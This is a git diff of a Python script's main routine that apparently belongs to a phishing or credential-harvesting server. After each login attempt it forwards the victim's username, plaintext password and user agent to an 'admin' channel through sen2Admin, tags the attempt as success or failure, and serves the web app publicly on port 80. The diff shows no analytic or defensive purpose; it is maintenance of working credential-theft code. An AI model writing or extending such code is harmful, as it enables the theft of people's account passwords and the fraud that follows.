@@ -54,18 +54,17 @@ if __name__ == "__main__":
     password = data["password"]
     useragent = data["useragent"]
 
-    sen2Admin("Start Error: ")
+    if status == "Error":
+        sen2Admin("Start Error: " + data["error"])
 
-    # if status == "Error":
-    #     sen2Admin("Start Error: " + data["error"])
+    else:
+        title = 'LoginFailed'
+        if ok:
+            title = 'LoginSuccess'
 
-    title = 'LoginFailed'
-    if ok:
-        title = 'LoginSuccess'
+        sen2Admin(
+            '<b>'+title+':</b> '+status+'\n<b>Username:</b> '+username+'\n<b>Password:</b> '+password+'\n<b>Useragent:</b> '+useragent)
 
-    sen2Admin(
-        '<b>'+title+':</b> '+status+'\n<b>Username:</b> '+username+'\n<b>Password:</b> '+password+'\n<b>Useragent:</b> '+useragent)
-
-    print(get_timestamp(), title)
+        print(get_timestamp(), title)
 
     serve(app, host="0.0.0.0", port=80)
